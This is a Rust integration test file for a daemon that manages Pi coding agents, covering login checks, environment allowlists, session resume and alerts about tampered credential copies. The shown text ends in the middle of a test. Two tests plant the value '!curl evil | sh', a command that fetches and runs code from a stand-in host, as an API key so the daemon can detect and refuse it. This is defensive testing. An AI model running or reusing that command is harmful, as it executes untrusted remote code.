//! Pi agents through the core, against the test backend with the stand-in for
//! Pi: a session file written as Pi's are and read through agent-tail's Pi
//! adapter, on a real shim. No model, no provider, no login. The real `pi` runs
//! in `pi_e2e.rs`, where there is one.

mod common;

use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Once};

use common::{Golden, publish_pi, wait_until};
use serde_json::Value;
use vibe_core::model::{
    Activity, AgentKind, AgentState, Environment, MessageRole, Mode, PiTarget, StopReason,
};
use vibe_core::paths::Layout;
use vibe_core::rpc::{
    AgentDeleteParams, AgentMessagesParams, AgentStartParams, ErrorCode, HostParams,
    PiInstallParams, ProfileCreateParams, ProfileUpdateParams, ProjectAddParams, ProjectParams,
};
use vibed::core::Core;

/// `vibed`'s own environment, with what a shell or a launchd job might leave
/// in it. Set once, before any agent: this binary's tests are all about it.
static STRAY: Once = Once::new();

fn set_stray_keys() {
    STRAY.call_once(|| {
        // SAFETY: only here, before any test of this binary starts an agent;
        // nothing else in it reads or writes these.
        unsafe {
            std::env::set_var("OPENROUTER_API_KEY", "stray-openrouter");
            std::env::set_var("ANTHROPIC_API_KEY", "stray-anthropic");
            std::env::set_var("ANTHROPIC_OAUTH_TOKEN", "stray-oauth");
            std::env::set_var("CLAUDE_CODE_OAUTH_TOKEN", "sk-ant-oat01-stray");
        }
    });
}

struct World {
    golden: Golden,
    core: Arc<Core>,
    layout: Layout,
}

async fn world() -> World {
    world_with(|_| {}).await
}

async fn world_with(change: impl FnOnce(&mut vibed::core::Config)) -> World {
    set_stray_keys();
    let golden = Golden::new();
    let mut config = golden.config();
    change(&mut config);
    let core = Arc::new(Core::open(config).unwrap());
    let project = golden.home.join("src/app");
    core.add_project(ProjectAddParams {
        path: Some(project.to_str().unwrap().into()),
        ..Default::default()
    })
    .await
    .unwrap();
    core.create_profile(ProfileCreateParams {
        project: "app".into(),
        name: "pi-linux".into(),
        agent: Some(AgentKind::Pi),
        pi_model: Some("mock/mock-model".into()),
        ..Default::default()
    })
    .unwrap();
    World {
        layout: Layout::new(&golden.home, "macos"),
        golden,
        core,
    }
}

impl World {
    /// The owner has signed in: a login in the store.
    fn sign_in(&self) {
        let dir = self.layout.linux_pi_logins_dir();
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("auth.json"),
            r#"{"mock":{"type":"api_key","key":"fake"}}"#,
        )
        .unwrap();
    }

    /// A profile whose model's provider Pi names a key for, so it can be said to
    /// lack one. `mock` is like an extension's, which Pi is left to try.
    fn profile_for_a_provider_pi_knows(&self) {
        self.core
            .create_profile(ProfileCreateParams {
                project: "app".into(),
                name: "pi-known".into(),
                agent: Some(AgentKind::Pi),
                pi_model: Some("xai/grok".into()),
                ..Default::default()
            })
            .unwrap();
    }

    async fn start(&self, prompt: &str) -> vibe_core::rpc::Agent {
        self.core
            .start_agent(AgentStartParams {
                project: "app".into(),
                profile: "pi-linux".into(),
                prompt: prompt.into(),
                ..Default::default()
            })
            .await
            .unwrap()
    }

    /// `<dir>.args` or `<dir>.env` beside its sessions: what the stand-in was
    /// started with, last.
    fn started_with(&self, r: &str, what: &str) -> String {
        let path = self
            .layout
            .agent_dir(r)
            .join(format!("{}.{what}", vibe_env::pi::VM_SESSIONS));
        wait_until("the stand-in to start", || path.is_file());
        fs::read_to_string(path).unwrap()
    }

    fn sessions(&self, r: &str) -> PathBuf {
        self.layout.agent_dir(r).join(vibe_env::pi::VM_SESSIONS)
    }

    async fn state(&self, r: &str) -> (AgentState, Activity, Option<StopReason>) {
        let list = self.core.agents(HostParams { host: None }).await.unwrap();
        let a = list.agents.iter().find(|a| a.agent == r).unwrap();
        (a.state, a.status.activity, a.status.stop_reason)
    }

    async fn wait_for(&self, r: &str, activity: Activity) {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
        loop {
            let (_, now, _) = self.state(r).await;
            if now == activity {
                return;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "{r} is {now}, not {activity}"
            );
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
    }

    /// Waits for `text` on its screen, which the socket's output call reads.
    async fn wait_screen(&self, r: &str, text: &str) {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
        loop {
            let screen = self
                .core
                .agent_output(None, r, None)
                .await
                .map(|s| s.screen)
                .unwrap_or_default();
            if screen.contains(text) {
                return;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "no {text:?} on its screen:\n{screen}"
            );
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
    }

    async fn delete(&self, r: &str) {
        self.core
            .delete_agent(AgentDeleteParams {
                host: None,
                agent: r.into(),
                force: Some(true),
            })
            .await
            .unwrap();
    }
}

/// Files in `dir`, by name.
fn names(dir: &Path) -> Vec<String> {
    fs::read_dir(dir)
        .map(|d| {
            d.map(|e| e.unwrap().file_name().into_string().unwrap())
                .collect()
        })
        .unwrap_or_default()
}

#[tokio::test]
async fn not_signed_in_is_said_at_once_and_undone() {
    let w = world().await;
    w.profile_for_a_provider_pi_knows();
    let e = w
        .core
        .start_agent(AgentStartParams {
            project: "app".into(),
            profile: "pi-known".into(),
            prompt: "hello".into(),
            name: Some("no-login".into()),
            ..Default::default()
        })
        .await
        .unwrap_err();
    assert_eq!(e.code, ErrorCode::Conflict.code());
    assert!(e.message.contains("/login"), "{}", e.message);
    // Nothing of it is left behind: no record, worktree or branch.
    assert!(
        w.core
            .agents(HostParams { host: None })
            .await
            .unwrap()
            .agents
            .is_empty()
    );
    assert!(!w.layout.worktree("app", "no-login").exists());
    assert_eq!(
        common::git_out(
            &w.golden.home.join("src/app"),
            &["branch", "--list", "no-login"]
        ),
        ""
    );
}

#[tokio::test]
async fn a_provider_of_the_owners_own_with_a_key_counts_as_signed_in() {
    let w = world().await;
    w.profile_for_a_provider_pi_knows();
    let dir = w.layout.linux_pi_dir();
    fs::create_dir_all(&dir).unwrap();
    fs::write(
        dir.join("models.json"),
        r#"{"providers":{"xai":{"apiKey":"k"}}}"#,
    )
    .unwrap();
    let a = w
        .core
        .start_agent(AgentStartParams {
            project: "app".into(),
            profile: "pi-known".into(),
            prompt: "hello".into(),
            ..Default::default()
        })
        .await
        .unwrap();
    w.delete(&a.agent).await;
}

/// What used to be let through only to read as busy for ever.
#[tokio::test]
async fn what_cant_answer_for_this_model_is_refused() {
    use std::os::unix::fs::PermissionsExt;
    let w = world().await;
    w.profile_for_a_provider_pi_knows();
    let dir = w.layout.linux_pi_logins_dir();
    fs::create_dir_all(&dir).unwrap();
    let refused = |w_core: Arc<Core>| async move {
        w_core
            .start_agent(AgentStartParams {
                project: "app".into(),
                profile: "pi-known".into(),
                prompt: "hello".into(),
                ..Default::default()
            })
            .await
            .unwrap_err()
    };
    // A login, for another provider than the profile's model.
    fs::write(
        dir.join("auth.json"),
        r#"{"openai":{"type":"oauth","access":"a","refresh":"r","expires":9}}"#,
    )
    .unwrap();
    let e = refused(Arc::clone(&w.core)).await;
    assert_eq!(e.code, ErrorCode::Conflict.code());
    assert!(e.message.contains("signed in to xai"), "{}", e.message);
    assert!(e.message.contains("/login"), "{}", e.message);
    fs::write(dir.join("auth.json"), "{}").unwrap();
    // An unrelated line of pi.env.
    let file = w.layout.pi_env_file();
    fs::create_dir_all(file.parent().unwrap()).unwrap();
    fs::write(&file, "EDITOR_THEME=dark\n").unwrap();
    fs::set_permissions(&file, fs::Permissions::from_mode(0o600)).unwrap();
    let e = refused(Arc::clone(&w.core)).await;
    assert!(e.message.contains("signed in to xai"), "{}", e.message);
    // A models.json with nothing in it.
    let config = w.layout.linux_pi_dir();
    fs::create_dir_all(&config).unwrap();
    fs::write(config.join("models.json"), "{}").unwrap();
    let e = refused(Arc::clone(&w.core)).await;
    assert!(e.message.contains("signed in to xai"), "{}", e.message);
}

/// N6: a provider Pi names no key for is an extension's or the owner's, and only
/// trying says whether it can answer.
#[tokio::test]
async fn a_provider_pi_doesnt_know_is_left_to_try() {
    let w = world().await;
    let a = w.start("hello").await;
    w.wait_for(&a.agent, Activity::Done).await;
    w.delete(&a.agent).await;
}

/// Pi throws before it writes anything and says so only on its screen, in what
/// no check before the start can catch: an expired login, say.
#[tokio::test]
async fn a_turn_that_fails_before_it_starts_shows_as_an_error() {
    let w = world().await;
    w.sign_in();
    let a = w.start("nologin").await;
    let r = a.agent.clone();
    assert_eq!(names(&w.sessions(&r)).len(), 0, "nothing on disk");
    w.wait_for(&r, Activity::Errored).await;
    let (state, _, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Idle);
    let agents = w
        .core
        .agents(HostParams { host: None })
        .await
        .unwrap()
        .agents;
    let error = agents[0].status.error.as_deref();
    assert_eq!(error, Some("No API key found for mock."));
    // Signed in again and told to go on, it does.
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "and again".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    w.wait_for(&r, Activity::Done).await;
    w.delete(&r).await;
}

#[tokio::test]
async fn a_prompt_starting_with_at_reaches_pi_as_a_prompt() {
    let w = world().await;
    w.sign_in();
    let a = w.start("@src/main.rs fix this").await;
    let args = w.started_with(&a.agent, "args");
    let args: Vec<&str> = args.lines().collect();
    assert_eq!(args[args.len() - 2..], ["--", " @src/main.rs fix this"]);
    w.wait_for(&a.agent, Activity::Done).await;
    w.delete(&a.agent).await;
}

/// `.vibe/setup.sh` for a Pi agent starts from the same allowlist Pi does.
#[tokio::test]
async fn a_pi_agents_setup_gets_no_stray_key() {
    let w = world().await;
    w.sign_in();
    let clone = w.golden.home.join("src/app");
    let repo = PathBuf::from(common::git_out(&clone, &["remote", "get-url", "origin"]));
    fs::create_dir_all(repo.join(".vibe")).unwrap();
    let seen = w.golden.home.join("setup-env");
    fs::write(
        repo.join(".vibe/setup.sh"),
        format!("env > {}\n", seen.display()),
    )
    .unwrap();
    common::git_out(&repo, &["add", ".vibe"]);
    common::git_out(&repo, &["commit", "-qm", "setup"]);
    let a = w.start("hello").await;
    let env = fs::read_to_string(&seen).unwrap();
    assert!(env.contains("GIT_CONFIG_COUNT="), "{env}");
    assert!(!env.contains("stray-"), "{env}");
    assert!(!env.contains("CLAUDE_CODE_OAUTH_TOKEN"), "{env}");
    w.delete(&a.agent).await;
}

/// A start, in full: what Pi is started with, its status, its answer, and its
/// environment, built from the allowlist.
#[tokio::test]
async fn a_pi_agent_starts_on_its_prompt_and_no_stray_key_reaches_it() {
    let w = world().await;
    w.sign_in();
    let a = w.start("-say hello").await;
    assert_eq!(a.kind, AgentKind::Pi);
    let r = a.agent.clone();
    assert_eq!(
        serde_json::to_value(&a).unwrap()["agent"],
        "pi",
        "the socket says which"
    );

    // Its arguments: one flag for the session, the prompt after `--`.
    let args = w.started_with(&r, "args");
    let args: Vec<&str> = args.lines().collect();
    assert_eq!(
        args,
        [
            "--session-id",
            a.session_id.as_str(),
            "--model",
            "mock/mock-model",
            "--thinking",
            "high",
            "--approve",
            "--",
            "-say hello"
        ]
    );

    // Its environment.
    let env = w.started_with(&r, "env");
    for stray in [
        "OPENROUTER_API_KEY",
        "ANTHROPIC_API_KEY",
        "ANTHROPIC_OAUTH_TOKEN",
        "CLAUDE_CODE_OAUTH_TOKEN",
    ] {
        assert!(
            !env.lines().any(|l| l.starts_with(&format!("{stray}="))),
            "{stray} reached Pi:\n{env}"
        );
    }
    assert!(!env.contains("sk-ant-oat01"), "{env}");
    assert!(!env.contains("stray-"), "{env}");
    for wanted in [
        "PI_SKIP_VERSION_CHECK=1",
        "PI_TELEMETRY=0",
        "GIT_CONFIG_COUNT=3",
    ] {
        assert!(env.lines().any(|l| l == wanted), "{wanted}:\n{env}");
    }
    assert!(env.contains("PI_CODING_AGENT_SESSION_DIR="), "{env}");
    // Its worktree's session, in its own directory, named as Pi names it.
    w.wait_for(&r, Activity::Done).await;
    let (state, _, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Idle);
    let files = names(&w.sessions(&r));
    assert_eq!(files.len(), 1, "{files:?}");
    assert!(
        files[0].ends_with(&format!("_{}.jsonl", a.session_id)),
        "{files:?}"
    );

    // Its conversation, through the same call as Claude's.
    let messages = w.core.agent_messages(None, &r, 10).await.unwrap();
    assert_eq!(
        messages
            .iter()
            .map(|m| (m.role, m.text.as_str()))
            .collect::<Vec<_>>(),
        [
            (MessageRole::User, "-say hello"),
            (MessageRole::Assistant, "Working on: -say hello"),
        ]
    );
    let via_rpc = w
        .core
        .messages_call(AgentMessagesParams {
            agent: r.clone(),
            last: Some(1),
            ..Default::default()
        })
        .await
        .unwrap();
    assert_eq!(via_rpc.messages.len(), 1);

    // And it's on its screen, which the socket's output call reads.
    w.wait_screen(&r, "Working on: -say hello").await;
    w.delete(&r).await;
}

/// What the owner set on purpose in `pi.env` is the one way in.
#[tokio::test]
async fn keys_set_on_purpose_reach_it() {
    use std::os::unix::fs::PermissionsExt;
    let w = world().await;
    let file = w.layout.pi_env_file();
    fs::create_dir_all(file.parent().unwrap()).unwrap();
    fs::write(&file, "OPENROUTER_API_KEY=on-purpose\n").unwrap();
    fs::set_permissions(&file, fs::Permissions::from_mode(0o600)).unwrap();
    w.sign_in();
    let a = w.start("hello").await;
    let env = w.started_with(&a.agent, "env");
    assert!(
        env.lines().any(|l| l == "OPENROUTER_API_KEY=on-purpose"),
        "{env}"
    );
    assert!(!env.contains("stray-"), "{env}");
    w.delete(&a.agent).await;

    // The Claude token can't be set that way. The start says why.
    fs::write(&file, "CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-x\n").unwrap();
    let e = w
        .core
        .start_agent(AgentStartParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            prompt: "hello".into(),
            ..Default::default()
        })
        .await
        .unwrap_err();
    assert!(e.message.contains("can't be set"), "{}", e.message);
}

/// Busy on a long, silent tool: never a question, whatever the wait.
#[tokio::test]
async fn a_long_tool_never_raises_a_hand() {
    let w = world().await;
    w.sign_in();
    let a = w.start("tool 3").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::RunningTool).await;
    let (state, _, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Busy);
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert!(!check.answered, "still at it");
    w.wait_for(&r, Activity::Done).await;
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert!(check.answered);
    assert_eq!(check.state, AgentState::Idle);
    w.delete(&r).await;
}

#[tokio::test]
async fn thinking_has_its_prompt_on_disk_and_is_busy() {
    let w = world().await;
    w.sign_in();
    let a = w.start("think 4").await;
    let r = a.agent.clone();
    // Pi writes its file at the first user message, not its first answer.
    wait_until("its file", || names(&w.sessions(&r)).len() == 1);
    let (state, _, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Busy);
    w.wait_for(&r, Activity::Done).await;
    w.delete(&r).await;
}

#[tokio::test]
async fn usage_limits_and_errors_are_shown() {
    let w = world().await;
    w.sign_in();
    let a = w.start("limit").await;
    w.wait_for(&a.agent, Activity::Errored).await;
    let (state, _, stop) = w.state(&a.agent).await;
    assert_eq!(state, AgentState::Idle);
    assert_eq!(stop, Some(StopReason::UsageLimit));
    w.delete(&a.agent).await;

    let a = w.start("error").await;
    w.wait_for(&a.agent, Activity::Errored).await;
    let (state, _, stop) = w.state(&a.agent).await;
    assert_eq!((state, stop), (AgentState::Idle, None));
    w.delete(&a.agent).await;
}

/// A send wakes one that exited, on the same session id: the same file goes on.
#[tokio::test]
async fn a_request_id_reaches_a_pi_agent_once_as_it_does_any_agent() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Done).await;
    let input = || vibe_mcp::Input::Text {
        text: "only once".into(),
        submit: true,
        force: false,
    };
    w.core.send_once(None, &r, input(), "first").await.unwrap();
    w.wait_screen(&r, "Working on: only once").await;
    w.wait_for(&r, Activity::Done).await;
    // The caller never heard, and makes it again: nothing more is typed.
    w.core.send_once(None, &r, input(), "first").await.unwrap();
    // Used for something else, it's refused.
    let other = vibe_mcp::Input::Text {
        text: "something else".into(),
        submit: true,
        force: false,
    };
    let refused = w
        .core
        .send_once(None, &r, other, "first")
        .await
        .unwrap_err();
    assert_eq!(refused.code, ErrorCode::Conflict.code(), "{refused:?}");
    let messages = w.core.agent_messages(None, &r, 20).await.unwrap();
    let times = messages.iter().filter(|m| m.text == "only once").count();
    assert_eq!(times, 1, "{messages:?}");
    w.delete(&r).await;
}

#[tokio::test]
async fn a_resume_goes_on_with_the_same_session() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Done).await;
    let before = names(&w.sessions(&r));
    assert_eq!(before.len(), 1);

    // Its processes go, as after a reboot.
    let socket = w.layout.session_socket(&r);
    let vibed::sessions::Probe::Running(session) = vibed::sessions::probe(&socket).await else {
        panic!("its session runs");
    };
    vibe_env::tree::SessionTree::new(session.pid).end(std::time::Duration::from_secs(5));
    wait_until("it to exit", || !socket.exists());
    w.core.resume_agent(None, &r).await.unwrap();
    w.wait_screen(&r, &format!("Resumed {}", a.session_id))
        .await;
    // The same id, and no prompt to run again.
    let args = w.started_with(&r, "args");
    let args: Vec<&str> = args.lines().collect();
    assert_eq!(args[..2], ["--session-id", a.session_id.as_str()]);
    assert!(!args.contains(&"--"), "{args:?}");

    let sent = w
        .core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "and again".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    assert!(!sent.woke);
    w.wait_screen(&r, "Working on: and again").await;
    assert_eq!(names(&w.sessions(&r)), before, "the same file, appended to");
    w.wait_for(&r, Activity::Done).await;
    let messages = w.core.agent_messages(None, &r, 10).await.unwrap();
    assert_eq!(messages.len(), 4, "{messages:?}");
    w.delete(&r).await;
}

/// Its processes go, as after a reboot.
async fn end_its_session(w: &World, r: &str) {
    let socket = w.layout.session_socket(r);
    let vibed::sessions::Probe::Running(session) = vibed::sessions::probe(&socket).await else {
        panic!("its session runs");
    };
    vibe_env::tree::SessionTree::new(session.pid).end(std::time::Duration::from_secs(5));
    wait_until("it to exit", || !socket.exists());
}

/// Pi writes nothing on a resume, so what its transcript left open stays open
/// there. It's over, or it would read as busy for ever.
#[tokio::test]
async fn a_turn_left_open_before_a_resume_is_over() {
    let w = world().await;
    w.sign_in();
    for prompt in ["tool 3600", "think 3600"] {
        let a = w.start(prompt).await;
        let r = a.agent.clone();
        wait_until("its file", || names(&w.sessions(&r)).len() == 1);
        let (state, _, _) = w.state(&r).await;
        assert_eq!(state, AgentState::Busy, "{prompt}");
        end_its_session(&w, &r).await;
        w.core.resume_agent(None, &r).await.unwrap();
        w.wait_for(&r, Activity::Interrupted).await;
        let (state, _, _) = w.state(&r).await;
        assert_eq!(state, AgentState::Idle, "{prompt}");
        // And what comes next counts as usual.
        w.core
            .send_input(
                None,
                &r,
                vibe_mcp::Input::Text {
                    text: "and again".into(),
                    submit: true,
                    force: false,
                },
            )
            .await
            .unwrap();
        w.wait_for(&r, Activity::Done).await;
        w.delete(&r).await;
    }
    // One that never got as far as a transcript is simply at rest.
    let a = w.start("nologin").await;
    w.wait_for(&a.agent, Activity::Errored).await;
    end_its_session(&w, &a.agent).await;
    w.core.resume_agent(None, &a.agent).await.unwrap();
    w.wait_for(&a.agent, Activity::Done).await;
    w.delete(&a.agent).await;
}

/// The toolbox's `/login` lands in its own copy; `vibed` takes it to the store and
/// gives it to every agent's, and Settings hears, without being asked.
#[tokio::test]
async fn a_toolbox_login_reaches_every_agent_and_says_so() {
    let w = world().await;
    let (_, mut events) = w.core.subscribe();
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let signin = w.layout.linux_pi_signin_dir();
    fs::create_dir_all(&signin).unwrap();
    fs::write(
        signin.join("auth.json"),
        r#"{"mock":{"type":"oauth","access":"a","refresh":"r","expires":9}}"#,
    )
    .unwrap();
    w.core.pi_watch(&mut seen).await;
    let store = w.layout.linux_pi_logins_dir();
    assert_eq!(vibe_env::pi::logins_in(&store), ["mock"]);
    let event = events.try_recv().unwrap();
    assert_eq!(event.kind, vibe_core::model::EventKind::PiChanged);
    assert_eq!(event.message, None);
    // It stays there too, as that's the toolbox's own Pi's login.
    assert_eq!(vibe_env::pi::logins_in(&signin), ["mock"]);
    // So an agent can start on it, and has its own copy.
    let a = w.start("hello").await;
    let copy = w
        .layout
        .agent_dir(&a.agent)
        .join(vibe_env::pi::VM_AGENT_DIR);
    assert_eq!(vibe_env::pi::logins_in(&copy), ["mock"]);
    w.delete(&a.agent).await;
}

/// D1: what one VM does to its copy stays there; every other carries on, and the
/// owner hears which, through Settings as well as the event.
#[tokio::test]
async fn a_copy_gone_bad_is_an_alert_for_that_agent_alone() {
    let w = world().await;
    w.sign_in();
    let (bad, good) = (w.start("one").await.agent, w.start("two").await.agent);
    w.wait_for(&bad, Activity::Done).await;
    w.wait_for(&good, Activity::Done).await;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = |r: &str| w.layout.agent_dir(r).join(vibe_env::pi::VM_AGENT_DIR);

    let (_, mut events) = w.core.subscribe();
    fs::write(
        copy(&bad).join("auth.json"),
        r#"{"x":1e999,"openai":{"type":"api_key","key":"!curl evil | sh"}}"#,
    )
    .unwrap();
    w.core.pi_watch(&mut seen).await;
    let event = events.try_recv().unwrap();
    assert_eq!(event.kind, vibe_core::model::EventKind::PiChanged);
    let said = event.message.unwrap();
    assert!(said.contains(&bad), "{said}");
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    let vms = status.vms.unwrap();
    assert_eq!(vms.alerts.len(), 1);
    assert!(vms.alerts[0].contains(&bad), "{:?}", vms.alerts);
    assert!(!vms.alerts[0].contains(&good), "{:?}", vms.alerts);
    // Nothing of it reached the store or the other agent, and no secret is told.
    assert_eq!(vms.logins, ["mock"]);
    assert_eq!(vibe_env::pi::logins_in(&copy(&good)), ["mock"]);
    assert!(!said.contains("curl"), "{said}");
    // It isn't said twice, and the other agent still gets what's new.
    fs::write(
        w.layout.linux_pi_logins_dir().join("auth.json"),
        r#"{"mock":{"type":"api_key","key":"newer"}}"#,
    )
    .unwrap();
    let (_, mut events) = w.core.subscribe();
    w.core.pi_watch(&mut seen).await;
    assert!(events.try_recv().is_err());
    let text = fs::read_to_string(copy(&good).join("auth.json")).unwrap();
    assert!(text.contains("newer"), "{text}");

    // Put right, the alert goes, and Settings hears that too.
    fs::write(copy(&bad).join("auth.json"), "{}").unwrap();
    w.core.pi_watch(&mut seen).await;
    assert_eq!(events.try_recv().unwrap().message, None);
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    assert!(status.vms.unwrap().alerts.is_empty());
    w.delete(&bad).await;
    w.delete(&good).await;
}

/// A first sign-in from inside an agent reaches the others, and can't be told
/// from a hostile one, so the owner is told.
#[tokio::test]
async fn a_first_sign_in_in_an_agent_is_told_to_the_owner() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await.agent;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = w.layout.agent_dir(&a).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(
        copy.join("auth.json"),
        r#"{"mock":{"type":"api_key","key":"fake"},"xai":{"type":"api_key","key":"k"}}"#,
    )
    .unwrap();
    let (_, mut events) = w.core.subscribe();
    w.core.pi_watch(&mut seen).await;
    let said = events.try_recv().unwrap().message.unwrap();
    assert!(said.contains(&a) && said.contains("xai"), "{said}");
    assert!(said.contains("toolbox"), "{said}");
    assert_eq!(
        vibe_env::pi::logins_in(&w.layout.linux_pi_logins_dir()),
        ["mock", "xai"]
    );
    w.delete(&a).await;
}

/// B1: a login Pi really writes, beside a bad one, in the same file: the good one
/// goes on, the bad one doesn't, and the owner hears which.
#[tokio::test]
async fn a_bad_login_beside_a_good_one_is_told_of_by_provider() {
    let w = world().await;
    w.sign_in();
    let r = w.start("hello").await.agent;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = w.layout.agent_dir(&r).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(
        copy.join("auth.json"),
        r#"{"mock":{"type":"api_key","key":"fake"},
            "xai":{"type":"api_key","key":"k"},
            "openai":{"type":"api_key","key":"!curl evil | sh"}}"#,
    )
    .unwrap();
    w.core.pi_watch(&mut seen).await;
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    let vms = status.vms.unwrap();
    assert_eq!(vms.logins, ["mock", "xai"]);
    let alerts = vms.alerts.join("\n");
    assert!(
        alerts.contains("login for openai would run a command"),
        "{alerts}"
    );
    assert!(alerts.contains("signed in to xai"), "{alerts}");
    assert!(!alerts.contains("curl"), "{alerts}");
    w.delete(&r).await;
}

/// B3: logins aren't kept in step for an agent asleep, and agents sleep within a
/// minute. It has to wake on what's current, by the time a send has typed to it.
#[tokio::test]
async fn a_woken_agent_is_on_the_login_of_now() {
    let w = world().await;
    let auth = |token: &str| {
        format!(
            r#"{{"mock":{{"type":"oauth","refresh":"{token}","access":"a","expires":1800000900000}}}}"#
        )
    };
    let signin = w.layout.linux_pi_signin_dir();
    fs::create_dir_all(&signin).unwrap();
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    fs::write(signin.join("auth.json"), auth("OLD")).unwrap();
    w.core.pi_watch(&mut seen).await;
    let r = w.start("hello").await.agent;
    w.wait_for(&r, Activity::Done).await;
    let copy = w
        .layout
        .agent_dir(&r)
        .join(vibe_env::pi::VM_AGENT_DIR)
        .join("auth.json");
    assert!(fs::read_to_string(&copy).unwrap().contains("OLD"));
    w.core.sleep_agent(None, &r).await.unwrap();
    fs::write(signin.join("auth.json"), auth("NEW")).unwrap();
    w.core.pi_watch(&mut seen).await;
    assert!(
        fs::read_to_string(&copy).unwrap().contains("OLD"),
        "one asleep isn't looked at"
    );
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "and again".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    assert!(fs::read_to_string(&copy).unwrap().contains("NEW"));
    w.delete(&r).await;
}

/// B4: an alert about an agent's copy stays while it sleeps, and goes with it.
#[tokio::test]
async fn an_agents_alert_outlasts_its_sleep() {
    let w = world().await;
    w.sign_in();
    let r = w.start("hello").await.agent;
    w.wait_for(&r, Activity::Done).await;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = w.layout.agent_dir(&r).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(copy.join("auth.json"), "not json").unwrap();
    w.core.pi_watch(&mut seen).await;
    let alerts = |w_core: Arc<Core>| async move {
        w_core
            .pi_status(HostParams { host: None })
            .await
            .unwrap()
            .vms
            .unwrap()
            .alerts
    };
    assert_eq!(alerts(Arc::clone(&w.core)).await.len(), 1);
    w.core.sleep_agent(None, &r).await.unwrap();
    w.core.pi_watch(&mut seen).await;
    assert_eq!(
        alerts(Arc::clone(&w.core)).await.len(),
        1,
        "asleep, it stands"
    );
    w.delete(&r).await;
    w.core.pi_watch(&mut seen).await;
    assert!(
        alerts(Arc::clone(&w.core)).await.is_empty(),
        "the agent's gone"
    );
}

/// What the backend finds at a launch or a wake isn't swallowed, or left for the
/// next tick.
#[tokio::test]
async fn a_copy_gone_bad_is_told_of_as_the_agent_resumes() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Done).await;
    end_its_session(&w, &r).await;
    let copy = w.layout.agent_dir(&r).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(copy.join("auth.json"), "not json").unwrap();
    w.core.resume_agent(None, &r).await.unwrap();
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    let alerts = status.vms.unwrap().alerts;
    assert_eq!(alerts.len(), 1, "with no tick since: {alerts:?}");
    assert!(alerts[0].contains(&r), "{alerts:?}");
    w.delete(&r).await;
}

/// Several things going wrong at once are each said.
#[tokio::test]
async fn every_alert_of_a_tick_is_said() {
    let w = world().await;
    w.sign_in();
    let (a, b) = (w.start("one").await.agent, w.start("two").await.agent);
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    for r in [&a, &b] {
        fs::write(
            w.layout
                .agent_dir(r)
                .join(vibe_env::pi::VM_AGENT_DIR)
                .join("auth.json"),
            "not json",
        )
        .unwrap();
    }
    let (_, mut events) = w.core.subscribe();
    w.core.pi_watch(&mut seen).await;
    let first = events.try_recv().unwrap().message.unwrap();
    let second = events.try_recv().unwrap().message.unwrap();
    let said = format!("{first}\n{second}");
    assert!(said.contains(&a) && said.contains(&b), "{said}");
    w.delete(&a).await;
    w.delete(&b).await;
}

/// Nit: Pi takes `/model` itself and writes nothing. That's no failed turn, even
/// under an answer that reads just like one.
#[tokio::test]
async fn a_send_pi_takes_itself_is_no_failed_turn() {
    let w = world().await;
    w.sign_in();
    let r = w.start("sayerror").await.agent;
    w.wait_for(&r, Activity::Done).await;
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "/model".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    let (_, activity, _) = w.state(&r).await;
    assert_eq!(activity, Activity::Done);
    w.delete(&r).await;
}

/// N1: the send before it was answered long ago, and a `/model` after it owes none.
#[tokio::test]
async fn a_send_pi_takes_itself_after_a_tracked_one_is_no_failed_turn() {
    let w = world().await;
    w.sign_in();
    let r = w.start("hello").await.agent;
    w.wait_for(&r, Activity::Done).await;
    let send = |text: &'static str| {
        let (core, r) = (Arc::clone(&w.core), r.clone());
        async move {
            core.send_input(
                None,
                &r,
                vibe_mcp::Input::Text {
                    text: text.into(),
                    submit: true,
                    force: false,
                },
            )
            .await
            .unwrap();
        }
    };
    send("sayerror").await;
